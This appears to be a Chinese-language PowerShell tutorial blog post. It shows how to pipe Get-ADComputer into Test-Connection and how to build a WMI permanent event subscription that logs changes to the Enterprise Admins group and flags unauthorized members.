<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span>&gt; <span class="built_in">Get-ADComputer</span> <span class="literal">-Filter</span> * | <span class="built_in">Test-Connection</span></span><br><span class="line"><span class="built_in">Test-Connection</span>: Cannot validate argument on <span class="keyword">parameter</span> <span class="string">&#x27;TargetName&#x27;</span>. The argument is null, empty, or an element of the argument collection contains a null value. Supply a collection that does not contain any null values and then <span class="keyword">try</span> the command again.</span><br><span class="line"><span class="built_in">Test-Connection</span>: Cannot validate argument on <span class="keyword">parameter</span> <span class="string">&#x27;TargetName&#x27;</span>. The argument is null, empty, or an element of the argument collection contains a null value. Supply a collection that does not contain any null values and then <span class="keyword">try</span> the command again.</span><br><span class="line"><span class="built_in">Test-Connection</span>: Cannot validate argument on <span class="keyword">parameter</span> <span class="string">&#x27;TargetName&#x27;</span>. The argument is null, empty, or an element of the argument collection contains a null value. Supply a collection that does not contain any null values and then <span class="keyword">try</span> the command again.</span><br><span class="line"><span class="built_in">Test-Connection</span>: Cannot validate argument on <span class="keyword">parameter</span> <span class="string">&#x27;TargetName&#x27;</span>. The argument is null, empty, or an element of the argument collection contains a null value. Supply a collection that does not contain any null values and then <span class="keyword">try</span> the command again.</span><br><span class="line"><span class="built_in">Test-Connection</span>: Cannot validate argument on <span class="keyword">parameter</span> <span class="string">&#x27;TargetName&#x27;</span>. The argument is null, empty, or an element of the argument collection contains a null value. Supply a collection that does not contain any null values and then <span class="keyword">try</span> the command again.</span><br></pre></td></tr></table></figure>

<p>这是怎么回事？</p>
<h3 id="属性-Property-参数-Parameter-未对齐"><a href="#属性-Property-参数-Parameter-未对齐" class="headerlink" title="属性(Property)/参数(Parameter) 未对齐"></a>属性(Property)/参数(Parameter) 未对齐</h3><p>我们这里有一个经典的，尽管相对不常见的情况。 <code>Test-Connection</code> cmdlet 使用参数名称 <strong>Target</strong> 来指示要测试连接的计算机。 但是，在此流水线命令中，<code>Get-ADComputer</code> 生成的对象不包含该名称的属性。 相反，这些对象具有名为 <strong>Name</strong> 和 <strong>DNSHostName</strong> 的属性。</p>
<p>提示：</p>
<p>在 Windows PowerShell 中，您使用参数 <strong>ComputerName</strong> 来指示您正在调查的计算机。 在 PowerShell 7 中，开发人员已将此参数名称更改为 <strong>TargetName</strong>。 为了获得最佳兼容性，该 cmdlet 定义了此参数的别名<strong>ComputerName</strong>。 此 cmdlet 允许您将 <strong>TargetName</strong> 或 <strong>Computername</strong> 与 <code>Test-Connection</code> 结合使用。</p>
<h3 id="ForEach-Object-来解决问题"><a href="#ForEach-Object-来解决问题" class="headerlink" title="ForEach-Object 来解决问题"></a>ForEach-Object 来解决问题</h3><p>解决这个参数/属性对齐问题非常容易。 您可以使用 <code>Foreach-Object</code> cmdlet，如下所示：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span>&gt; <span class="built_in">Get-ADComputer</span> <span class="literal">-Filter</span> * | </span><br><span class="line">             <span class="built_in">ForEach-Object</span> &#123;<span class="string">&quot;<span class="variable">$_</span>&quot;</span>;<span class="built_in">Test-Connection</span> <span class="literal">-TargetName</span> <span class="variable">$_</span>.Name;<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">CN=COOKHAM1,OU=Domain Controllers,DC=cookham,DC=net</span><br><span class="line">   Destination: COOKHAM1</span><br><span class="line">Ping Source      Address      Latency BufferSize Status</span><br><span class="line">                                 (ms)        (B)</span><br><span class="line">---- ------      -------      ------- ---------- ------</span><br><span class="line">   <span class="number">1</span> cookham24   <span class="number">10.10</span>.<span class="number">10.9</span>         <span class="number">0</span>         <span class="number">32</span> Success</span><br><span class="line">   <span class="number">2</span> cookham24   <span class="number">10.10</span>.<span class="number">10.9</span>         <span class="number">0</span>         <span class="number">32</span> Success</span><br><span class="line">   <span class="number">3</span> cookham24   <span class="number">10.10</span>.<span class="number">10.9</span>         <span class="number">0</span>         <span class="number">32</span> Success</span><br><span class="line">   <span class="number">4</span> cookham24   <span class="number">10.10</span>.<span class="number">10.9</span>         <span class="number">0</span>         <span class="number">32</span> Success</span><br><span class="line"></span><br><span class="line">CN=win10lt,OU=CookhamHQ,DC=cookham,DC=net</span><br><span class="line">   Destination: win10lt</span><br><span class="line">Ping Source      Address          Latency BufferSize Status</span><br><span class="line">                                     (ms)        (B)</span><br><span class="line">---- ------      -------          ------- ---------- ------</span><br><span class="line">   <span class="number">1</span> cookham24   *                      <span class="number">0</span>         <span class="number">32</span> DestinationHost…</span><br><span class="line">   <span class="number">2</span> cookham24   *                      <span class="number">0</span>         <span class="number">32</span> DestinationHost…</span><br><span class="line">   <span class="number">3</span> cookham24   *                      <span class="number">0</span>         <span class="number">32</span> DestinationHost…</span><br><span class="line">   <span class="number">4</span> cookham24   *                      <span class="number">0</span>         <span class="number">32</span> DestinationHost…</span><br><span class="line"></span><br><span class="line">CN=SLTPC,CN=Computers,DC=cookham,DC=net</span><br><span class="line">   Destination: SLTPC</span><br><span class="line">Ping Source      Address                   Latency BufferSize Status</span><br><span class="line">                                              (ms)        (B)</span><br><span class="line">|---- ------      -------                   ------- ---------- ------</span><br><span class="line">   <span class="number">1</span> cookham24   <span class="number">2</span>a02:<span class="number">8010</span>:<span class="number">6386</span>:<span class="number">0</span>:f810:<span class="number">2</span>b…       <span class="number">1</span>         <span class="number">32</span> Success</span><br><span class="line">   <span class="number">2</span> cookham24   <span class="number">2</span>a02:<span class="number">8010</span>:<span class="number">6386</span>:<span class="number">0</span>:f810:<span class="number">2</span>b…       <span class="number">0</span>         <span class="number">32</span> Success</span><br><span class="line">   <span class="number">3</span> cookham24   <span class="number">2</span>a02:<span class="number">8010</span>:<span class="number">6386</span>:<span class="number">0</span>:f810:<span class="number">2</span>b…       <span class="number">0</span>         <span class="number">32</span> Success</span><br><span class="line">   <span class="number">4</span> cookham24   <span class="number">2</span>a02:<span class="number">8010</span>:<span class="number">6386</span>:<span class="number">0</span>:f810:<span class="number">2</span>b…       <span class="number">3</span>         <span class="number">32</span> Success</span><br><span class="line">etc</span><br></pre></td></tr></table></figure>

<h3 id="使用可扩展类型系统"><a href="#使用可扩展类型系统" class="headerlink" title="使用可扩展类型系统"></a>使用可扩展类型系统</h3><p>如果您计划进行大量此类工作，则有一种更直接的方法可以解决这个属性/参数对齐问题。 您可以使用可扩展类型系统 (Extensible Type System，ETS) 扩展任何 AD 计算机对象以包含 Name 或 DNSHostName 属性的别名。 您可以通过一个小的 XML 文件定义此扩展，然后导入该文件，如下所示：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span>&gt; <span class="built_in">Get-Content</span> <span class="string">&#x27;.aaatypes.types.ps1xml&#x27;</span></span><br><span class="line">&lt;Types&gt;</span><br><span class="line"> &lt;<span class="built_in">Type</span>&gt;</span><br><span class="line">    &lt;Name&gt;Microsoft.ActiveDirectory.Management.ADComputer&lt;/Name&gt;</span><br><span class="line">    &lt;Members&gt;</span><br><span class="line">       &lt;AliasProperty&gt;</span><br><span class="line">          &lt;Name&gt;TargetName&lt;/Name&gt;</span><br><span class="line">          &lt;ReferencedMemberName&gt;DNSHostName&lt;/ReferencedMemberName&gt;</span><br><span class="line">         &lt;/AliasProperty&gt;</span><br><span class="line">    &lt;/Members&gt;</span><br><span class="line">  &lt;/<span class="built_in">Type</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/Types&gt;</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span>&gt; <span class="built_in">Update-TypeData</span> <span class="literal">-PrependPath</span> .aaatypes.types.ps1xml</span><br><span class="line"><span class="built_in">PS</span>&gt; <span class="built_in">Get-ADComputer</span> <span class="literal">-Identity</span> Cookham1 | <span class="built_in">Test-Connection</span></span><br><span class="line"></span><br><span class="line">   Destination: Cookham1.cookham.net</span><br><span class="line"></span><br><span class="line">Ping Source           Address                   Latency BufferSize Status</span><br><span class="line">                                                   (ms)        (B)</span><br><span class="line">---- ------           -------                   ------- ---------- ------</span><br><span class="line">   <span class="number">1</span> cookham24        <span class="number">10.10</span>.<span class="number">10.9</span>                      <span class="number">0</span>         <span class="number">32</span> Success</span><br><span class="line">   <span class="number">2</span> cookham24        <span class="number">10.10</span>.<span class="number">10.9</span>                      <span class="number">0</span>         <span class="number">32</span> Success</span><br><span class="line">   <span class="number">3</span> cookham24        <span class="number">10.10</span>.<span class="number">10.9</span>                      <span class="number">0</span>         <span class="number">32</span> Success</span><br><span class="line">   <span class="number">4</span> cookham24        <span class="number">10.10</span>.<span class="number">10.9</span>                      <span class="number">0</span>         <span class="number">32</span> Success</span><br></pre></td></tr></table></figure>

<p>您可以通过将 <code>Update-TypeData</code> 添加到您的 PowerShell 配置文件来保留此 ETS 扩展。 这样，每次启动 PowerShell 会话时，该 ETS 扩展就已就位并准备好为您提供帮助。</p>
<p>有关 ETS 的详细信息和背景，请参阅<a href="https://docs.microsoft.com/powershell/scripting/developer/ets/overview">扩展类型系统概述</a>。</p>
<h3 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h3><p><code>Get-ADComputer</code> cmdlet 生成的对象的属性在管道方面未被对象开发人员与 <code>Test-Connection</code> 对齐。 有一个简单的方法可以解决这个问题，即使用 <code>For-EachObject</code>，尽管它需要更多的输入。 您还可以使用 ETS 扩展 <strong>ADComputer</strong> 对象以获得更友好的别名。</p>
<h3 id="致敬-1"><a href="#致敬-1" class="headerlink" title="致敬"></a>致敬</h3><p>本文基于此博客问题队列中的请求，请参阅帖子<a href="https://github.com/PowerShell/Community-Blog/issues/21">请求 – 如何获取域中所有活动的服务器？</a>。</p>
<h2 id="如何监控-AD-组成员的变化"><a href="#如何监控-AD-组成员的变化" class="headerlink" title="如何监控 AD 组成员的变化"></a>如何监控 AD 组成员的变化</h2><p>问题：是否有一种简单的方法来检测和更改重要的 AD 组成员？</p>
<p>解答：使用 PowerShell 7、WMI 和 CIM Cmdlet。</p>
<h3 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h3><p>Windows Management Instrumentation (WMI) 是 Windows 操作系统的重要组成部分。 WMI 是基于 Windows 的计算机上的管理数据和管理操作的基础结构。 您可以使用 PowerShell 检索有关主机的信息，例如 BIOS 序列号。 此外，您还可以执行管理操作，例如创建 SMB 共享。</p>
<p>在许多情况下，WMI 只是另一种做事的方式。 例如，您可以使用 WMI 通过使用 <strong>Win32_Share</strong> 类的 <code>Create</code> 方法来创建 SMB 共享。 有关详细信息，请参阅 <a href="https://docs.microsoft.com/windows/win32/cimwin32prov/win32-share">Win32_Share 类</a>的文档页面。 在大多数情况下，您使用 PowerShell cmdlet（例如 SMB cmdlet）来管理您的 SMB 共享。 WMI 的价值在于它可以让您访问更多使用 cmdlet 无法访问的信息和功能。</p>
<p>在撰写本文时，我假设您了解 WMI。 具体而言，我假设您了解 WMI 命名空间、类、属性和方法。 如果没有，您可能想查看 <a href="https://docs.microsoft.com/windows/win32/wmisdk/wmi-start-page">WMI 文档</a>。</p>
<h3 id="WMI-事件"><a href="#WMI-事件" class="headerlink" title="WMI 事件"></a>WMI 事件</h3><p>WMI 的一个很酷且非常强大的功能是事件处理。 使用 WMI 事件，您可以订阅一个事件，例如 AD 组成员的更改。 如果发生该事件，您可以采取一些措施，例如写入日志文件或发送电子邮件。 WMI 事件处理相当简单且非常强大——如果您知道要使用哪些类以及如何使用它们！</p>
<p>WMI 中有两大类事件。 通过临时事件，您可以在 PowerShell 会话中使用 PowerShell 来订阅事件并处理它们。 如果关闭该会话，事件订阅和事件处理程序将丢失。 要使临时 WMI 事件持续监视，您必须使主机保持打开状态并登录，这并不是最优解。 临时事件很适合处理故障排除，但不适合长期监控。</p>
<p>通过永久事件处理，您也需要告诉 WMI 要处理什么事件以及在事件发生时要做什么。 为此，要将事件处理的详细信息添加到 WMI 存储库。 这样 WMI 可以在关闭会话、注销甚至重新启动主机后继续监视事件。 借助 PowerShell 和 PowerShell 远程处理，可以非常轻松地在多台服务器上部署 WMI 事件检测。</p>
<p>需要提醒你，wmi事件文档可能不会覆盖所有情况。 一些文档专注于开发人员，因此缺少很好的 PowerShell 示例。</p>
<h3 id="永久事件消费者"><a href="#永久事件消费者" class="headerlink" title="永久事件消费者"></a>永久事件消费者</h3><p>在 WMI 中，永久事件使用者是一个内置的 COM 组件，它在任何给定事件发生时执行某些操作。 从理论上讲，我想您可以开发一个私有 WMI 事件使用者，但我从未见过有人开发过。 当然，我并不是说没有人做过。 如果你看到了这个——请发表评论，因为我很想看到代码并理解细节。</p>
<p>Microsoft 在 Windows 中提供了五个关键的 WMI 永久事件消费者：</p>
<ul>
<li><strong>Active Script Consumer</strong>：可以使用它来运行特定的 VBS 脚本。</li>
<li><strong>Log File Consumer</strong>：将可自定义文本的字符串写入文本文件。</li>
<li><strong>NT Event Log Consumer</strong>：将事件详细信息写入 Windows 应用程序事件日志。</li>
<li><strong>SMTP Event Consumer</strong>：在事件发生时发送 SMTP 电子邮件消息</li>
<li><strong>Command Line Consumer</strong>：运行带有参数的程序，例如运行PowerShell 7 并指定要运行的脚本。</li>
</ul>
<p><strong>Active Script Consumer</strong> 仅运行 VBS 脚本。 如果不重新开发 COM 组件，您不能将此 Consumer 与 Powershell 脚本一起使用。 <strong>Log File Consumer</strong> 非常适合将高度自定义的短消息写入文本文件，但可能需要一些时间和精力才能实现。 对于大多数 IT 专业人员来说， <strong>Command Line Consumer</strong> 是一个不错的选择。使用此 Consumer ，您可以让 WMI 在事件发生时随时运行 PowerShell 脚本，例如对 AD 组的更改。 让我们看看如何使用这个永久事件使用者来发现对 Enterprise Admins 组成员的更改。</p>
<h3 id="创建永久事件处理程序"><a href="#创建永久事件处理程序" class="headerlink" title="创建永久事件处理程序"></a>创建永久事件处理程序</h3><p>使用 WMI 永久事件处理，您需要在 CIM 数据库中创建三个对象。</p>
<ul>
<li>事件过滤器（Event filter）——过滤器告诉 WMI 要检测哪个事件，例如对 AD 组的更改。</li>
<li>事件消费者（Event consumer）——这告诉 WMI 要运行哪个永久事件消费者以及如何调用消费者，例如运行命令行消费者和运行 <code>Monitor.ps1</code>。</li>
<li>事件绑定（Event binding）——这将过滤器（要注意的事件）绑定到消费者（事件发生时要做什么）</li>
</ul>
<p>要执行这三个操作，您需要将新对象插入到三个特定的 WMI 系统类中。 WMI 系统类实例使 WMI 能够在您停止 PowerShell 会话、注销或重新启动主机后继续处理事件。</p>
<p>在下面的代码中，使用 <strong>Command Line Consumer</strong> 来检测对 AD 的企业管理员组的更改。 每次发生更改事件时，您都希望 WMI 运行特定的脚本，即 <code>Monitor.ps1</code>。 此脚本将 Enterprise Admins 组的当前成员列表显示到日志文件中，并报告该成员现在是否包含未经授权的用户。 如果脚本发现未经授权的用户现在是组成员，它会将详细信息写入文本文件供您稍后查看。</p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>此解决方案有几个步骤。 所以，请系好安全带，我们出发吧。</p>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>在本文中，您想要检测未经授权的用户是否是 Enterprise Admins 组的成员。 您必须首先创建授权用户的文件。 然后创建两个辅助函数来帮助您测试代码。 从主机中全方位删除 WMI 事件过滤器的功能非常有用，除非您打算让过滤器永远运行。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1. Create a list of valid users for the Enterprise Admins group</span></span><br><span class="line"><span class="variable">$OKUsersFile</span> = <span class="string">&#x27;C:\Foo\OKUsers.Txt&#x27;</span></span><br><span class="line"><span class="variable">$OKUsers</span>  =  <span class="string">@&#x27;</span></span><br><span class="line"><span class="string">Administrator</span></span><br><span class="line"><span class="string">JerryG</span></span><br><span class="line"><span class="string">&#x27;@</span></span><br><span class="line"><span class="variable">$OKUsers</span> | </span><br><span class="line">  <span class="built_in">Out-File</span> <span class="literal">-FilePath</span> <span class="variable">$OKUsersFile</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. Define two helper functions to get/remove permanent events</span></span><br><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">Get-WMIPE</span></span> &#123;</span><br><span class="line">  <span class="string">&#x27;*** Event Filters Defined ***&#x27;</span></span><br><span class="line">  <span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\subscription <span class="literal">-ClassName</span> __EventFilter  |</span><br><span class="line">    <span class="built_in">Where-Object</span> Name <span class="operator">-eq</span> <span class="string">&quot;EventFilter1&quot;</span> |</span><br><span class="line">     <span class="built_in">Format-Table</span> Name, Query</span><br><span class="line">  <span class="string">&#x27;***Consumer Defined ***&#x27;</span></span><br><span class="line">  <span class="variable">$NS</span> = <span class="string">&#x27;ROOT\subscription&#x27;</span></span><br><span class="line">  <span class="variable">$CN</span> = <span class="string">&#x27;CommandLineEventConsumer&#x27;</span></span><br><span class="line">  <span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> <span class="variable">$ns</span> <span class="literal">-ClassName</span>  <span class="variable">$CN</span> |</span><br><span class="line">    <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.name <span class="operator">-eq</span> <span class="string">&quot;EventConsumer1&quot;</span>&#125;  |</span><br><span class="line">     <span class="built_in">Format-Table</span> Name, CommandLineTemplate</span><br><span class="line">  <span class="string">&#x27;***Bindings Defined ***&#x27;</span></span><br><span class="line">  <span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\subscription <span class="literal">-ClassName</span> __FilterToConsumerBinding |</span><br><span class="line">    <span class="built_in">Where-Object</span> <span class="literal">-FilterScript</span> &#123;<span class="variable">$_</span>.Filter.Name <span class="operator">-eq</span> <span class="string">&quot;EventFilter1&quot;</span>&#125; |</span><br><span class="line">      <span class="built_in">Format-Table</span> <span class="keyword">Filter</span>, Consumer</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">Function</span> <span class="title">Remove-WMIPE</span></span> &#123;</span><br><span class="line">  <span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\subscription __EventFilter | </span><br><span class="line">    <span class="built_in">Where-Object</span> Name <span class="operator">-eq</span> <span class="string">&quot;EventFilter1&quot;</span> |</span><br><span class="line">      <span class="built_in">Remove-CimInstance</span></span><br><span class="line">  <span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\subscription CommandLineEventConsumer | </span><br><span class="line">    <span class="built_in">Where-Object</span> Name <span class="operator">-eq</span> <span class="string">&#x27;EventConsumer1&#x27;</span> |</span><br><span class="line">      <span class="built_in">Remove-CimInstance</span></span><br><span class="line">  <span class="built_in">Get-CimInstance</span> <span class="literal">-Namespace</span> ROOT\subscription __FilterToConsumerBinding  |</span><br><span class="line">    <span class="built_in">Where-Object</span> <span class="literal">-FilterScript</span> &#123;<span class="variable">$_</span>.Filter.Name <span class="operator">-eq</span> <span class="string">&#x27;EventFilter1&#x27;</span>&#125;   |</span><br><span class="line">      <span class="built_in">Remove-CimInstance</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这两个步骤不产生输出。 当您创建 <code>OkUsers.txt</code> 文件时——确保文件中的用户实际上在您的 AD 中。</p>
<p>PS：<code>Get-CimInstance -Namespace ROOT\subscription __FilterToConsumerBinding</code>命令在windows powershell 5.1下执行会报错，暂不知道原因。</p>
<p>查看和删除可以使用 Get-WMIObject  cmdlet</p>
<p>Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter “__Path LIKE ‘%EventFilter1%’”</p>
<p>Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter “__Path LIKE ‘%EventFilter1%’” | Remove-WmiObject -Verbose</p>
<p><img src="https://ax-x.github.io/2023/04/17/PowerShell-Community/1672938921071-3f3107cc-9101-4836-b9da-40c9005e136a.png" alt="img"></p>
<p>解决方案是重建 WMI 存储库。</p>
<p>起初我按照在线说明从 MOF 文件重建，但这些都不起作用，所以我备份了存储库，然后从另一台机器上复制了一个工作存储库。</p>
<p>路径: C:\Windows\System32\wbem\respository</p>
<h4 id="创建-WQL-事件查询和-WMI-事件过滤器"><a href="#创建-WQL-事件查询和-WMI-事件过滤器" class="headerlink" title="创建 WQL 事件查询和 WMI 事件过滤器"></a>创建 WQL 事件查询和 WMI 事件过滤器</h4><p>要告诉 WMI 您希望 WMI 检测什么事件，您可以创建一个 WMI 查询语言 (WQL) 查询。 在每个 WMI 命名空间中，您可以找到表示事件通知的各种系统类。 例如，您可以使用 <strong>__InstanceModificationEvent</strong> 类来检测实例的任何修改（在该命名空间中）。 您同样可以使用 <strong>__MethodInvocationEvent</strong> 类来跟踪 WMI 方法调用。 如果 Windows 主机中的任何地方发生变化，您可能可以使用 WMI 事件来检测变化。</p>
<p>下面是创建 WQL 查询和 WMI 事件过滤器的代码：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 3. Create a WQL event filter query</span></span><br><span class="line"><span class="variable">$Group</span> = <span class="string">&#x27;Enterprise Admins&#x27;</span></span><br><span class="line"><span class="variable">$Query</span> = <span class="string">@&quot;</span></span><br><span class="line"><span class="string">  SELECT * From __InstanceModificationEvent Within 10  </span></span><br><span class="line"><span class="string">   WHERE TargetInstance ISA &#x27;ds_group&#x27; AND </span></span><br><span class="line"><span class="string">         TargetInstance.ds_name = &#x27;<span class="variable">$Group</span>&#x27;</span></span><br><span class="line"><span class="string">&quot;@</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. Create the event filter</span></span><br><span class="line"><span class="variable">$Param</span> = <span class="selector-tag">@</span>&#123;</span><br><span class="line">  QueryLanguage =  <span class="string">&#x27;WQL&#x27;</span></span><br><span class="line">  Query          =  <span class="variable">$Query</span></span><br><span class="line">  Name           =  <span class="string">&#x27;EventFilter1&#x27;</span></span><br><span class="line">  EventNameSpace =  <span class="string">&#x27;ROOT/directory/LDAP&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$IHT</span> = <span class="selector-tag">@</span>&#123;</span><br><span class="line">  ClassName = <span class="string">&#x27;__EventFilter&#x27;</span></span><br><span class="line">  Namespace = <span class="string">&#x27;ROOT/subscription&#x27;</span></span><br><span class="line">  Property  = <span class="variable">$Param</span></span><br><span class="line">&#125;        </span><br><span class="line"><span class="variable">$InstanceFilter</span> = <span class="built_in">New-CimInstance</span> @IHT</span><br></pre></td></tr></table></figure>

<p>在此代码中（不产生任何输出），过滤器查询没有说明查询正在查看哪个命名空间，只是说明有一个目标类供 WMI 监视。 在事件过滤器中，会在 <strong>ROOT/Subscription</strong> 命名空间的 <strong>EventFilter</strong> 类中创建一个新实例。 该实例告诉 WMI 监视 <strong>ROOT/directory/LDAP</strong> 名称空间中的 <strong>ds_group</strong> 类。</p>
<h4 id="创建事件消费者"><a href="#创建事件消费者" class="headerlink" title="创建事件消费者"></a>创建事件消费者</h4><p>下一步是创建一个事件消费者——希望 WMI 在检测到事件发生时执行的操作。 在我们的示例中，我们希望 WMI 永久事件处理程序 COM 对象在事件发生时运行脚本 <code>Monitor.ps1</code>。 因此，只要 WMI 检测到对企业管理员组的更改，您就希望 WMI 运行脚本。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 5. Create Monitor.ps1</span></span><br><span class="line"><span class="variable">$MONITOR</span> = <span class="string">@&#x27;</span></span><br><span class="line"><span class="string">$LogFile   = &#x27;C:\Foo\Grouplog.Txt&#x27;</span></span><br><span class="line"><span class="string">$Group     = &#x27;Enterprise Admins&#x27;</span></span><br><span class="line"><span class="string">&quot;On:  [$(Get-Date)]  Group [$Group] was changed&quot; | </span></span><br><span class="line"><span class="string">  Out-File -Force $LogFile -Append -Encoding Ascii</span></span><br><span class="line"><span class="string">$ADGM = Get-ADGroupMember -Identity $Group</span></span><br><span class="line"><span class="string"># Display who&#x27;s in the group</span></span><br><span class="line"><span class="string">&quot;Group Membership&quot;</span></span><br><span class="line"><span class="string">$ADGM | Format-Table Name, DistinguishedName |</span></span><br><span class="line"><span class="string">  Out-File -Force $LogFile -Append  -Encoding Ascii</span></span><br><span class="line"><span class="string">$OKUsers = Get-Content -Path C:\Foo\OKUsers.txt</span></span><br><span class="line"><span class="string"># Look at who is not authorized</span></span><br><span class="line"><span class="string">foreach ($User in $ADGM) &#123;</span></span><br><span class="line"><span class="string">  if ($User.SamAccountName -notin $OKUsers) &#123;</span></span><br><span class="line"><span class="string">    &quot;Unauthorized user [$($User.SamAccountName)] added to $Group&quot;  | </span></span><br><span class="line"><span class="string">      Out-File -Force $LogFile -Append  -Encoding Ascii</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&quot;**********************************`n`n&quot; | </span></span><br><span class="line"><span class="string">Out-File -Force $LogFile -Append -Encoding Ascii</span></span><br><span class="line"><span class="string">&#x27;@</span></span><br><span class="line"><span class="variable">$MONITOR</span> | <span class="built_in">Out-File</span> <span class="literal">-FilePath</span> C:\Foo\Monitor.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. Create a WMI event consumer</span></span><br><span class="line"><span class="comment">#    The consumer runs PowerShell 7 to execute C:\Foo\Monitor.ps1</span></span><br><span class="line"><span class="comment"># Pwsh.exe是powershell 6.0之后调用powershell的二进制文件，5.1使用powershell.exe</span></span><br><span class="line"><span class="comment"># $CLT = &#x27;Pwsh.exe -File C:\Foo\Monitor.ps1&#x27;</span></span><br><span class="line"><span class="variable">$CLT</span> = <span class="string">&#x27;powershell.exe -File C:\Foo\Monitor.ps1&#x27;</span></span><br><span class="line"><span class="variable">$Param</span> =[<span class="type">ordered</span>] <span class="selector-tag">@</span>&#123;</span><br><span class="line">  Name                = <span class="string">&#x27;EventConsumer1&#x27;</span></span><br><span class="line">  CommandLineTemplate = <span class="variable">$CLT</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ECHT</span> = <span class="selector-tag">@</span>&#123;</span><br><span class="line">  Namespace = <span class="string">&#x27;ROOT/subscription&#x27;</span></span><br><span class="line">  ClassName = <span class="string">&quot;CommandLineEventConsumer&quot;</span></span><br><span class="line">  Property  = <span class="variable">$param</span></span><br><span class="line">&#125;        </span><br><span class="line"><span class="variable">$InstanceConsumer</span> = <span class="built_in">New-CimInstance</span> @ECHT</span><br></pre></td></tr></table></figure>

<p>监控脚本相当简单——每次事件发生时，它都会将一些信息打印到日志文件中。 然后它会查看 Enterprise Admins 组是否包含未经授权的用户——如果是，脚本会将该事实报告到日志文件中。 这个脚本相当简单，你可以修饰。 如所须。 例如，您可以删除所有未经授权的用户。</p>
<p>要创建 WMI 事件使用者，请将新实例添加到命名空间 <strong>ROOT/Subscription</strong> 中的 <strong>CommandLineEventConsumer</strong> 类。</p>
<h4 id="绑定事件过滤器和事件消费者"><a href="#绑定事件过滤器和事件消费者" class="headerlink" title="绑定事件过滤器和事件消费者"></a>绑定事件过滤器和事件消费者</h4><p>将事件过滤器和事件消费者详细信息添加到 WMI 后，您需要绑定两者 - 告诉 WMI 检测该事件并在事件发生时运行该脚本。 例如，您可以预先创建多个事件过滤器和事件使用者。 绑定到位后，WMI 将启动监视过程。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 7. Bind the filter and consumer</span></span><br><span class="line"><span class="variable">$Param</span> = <span class="selector-tag">@</span>&#123;</span><br><span class="line">  <span class="keyword">Filter</span>   = [<span class="type">ref</span>]<span class="variable">$InstanceFilter</span>     </span><br><span class="line">  Consumer = [<span class="type">ref</span>]<span class="variable">$InstanceConsumer</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$IBHT</span> = <span class="selector-tag">@</span>&#123;</span><br><span class="line">  Namespace = <span class="string">&#x27;ROOT/subscription&#x27;</span></span><br><span class="line">  ClassName = <span class="string">&#x27;__FilterToConsumerBinding&#x27;</span></span><br><span class="line">  Property  = <span class="variable">$Param</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$InstanceBinding</span> = <span class="built_in">New-CimInstance</span> @IBHT</span><br></pre></td></tr></table></figure>

<h4 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h4><p>检查您的工作的一个好方法是调用您之前创建的 <code>Get-WMIPE</code> 函数。 你应该看到的是：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> &gt; <span class="comment"># 8. Viewing the event registration details</span></span><br><span class="line"><span class="built_in">PS</span> &gt; <span class="built_in">Get-WMIPE</span></span><br><span class="line">*** Event Filters Defined ***</span><br><span class="line"></span><br><span class="line">Name         Query</span><br><span class="line">----         -----</span><br><span class="line">EventFilter1   <span class="built_in">SELECT</span> * From __InstanceModificationEvent Within <span class="number">10</span></span><br><span class="line">                <span class="built_in">WHERE</span> TargetInstance ISA <span class="string">&#x27;ds_group&#x27;</span> AND</span><br><span class="line">                      TargetInstance.ds_name = <span class="string">&#x27;Enterprise Admins&#x27;</span></span><br><span class="line"></span><br><span class="line">***Consumer Defined ***</span><br><span class="line"></span><br><span class="line">Name           CommandLineTemplate</span><br><span class="line">----           -------------------</span><br><span class="line">EventConsumer1 Pwsh.exe <span class="operator">-File</span> C:\Foo\Monitor.ps1</span><br><span class="line"></span><br><span class="line">***Bindings Defined ***</span><br><span class="line"></span><br><span class="line"><span class="keyword">Filter</span>                                Consumer</span><br><span class="line">------                                --------</span><br><span class="line">__EventFilter (Name = <span class="string">&quot;EventFilter1&quot;</span>) CommandLineEventConsumer (Name = <span class="string">&quot;EventConsumer1&quot;</span>)</span><br></pre></td></tr></table></figure>

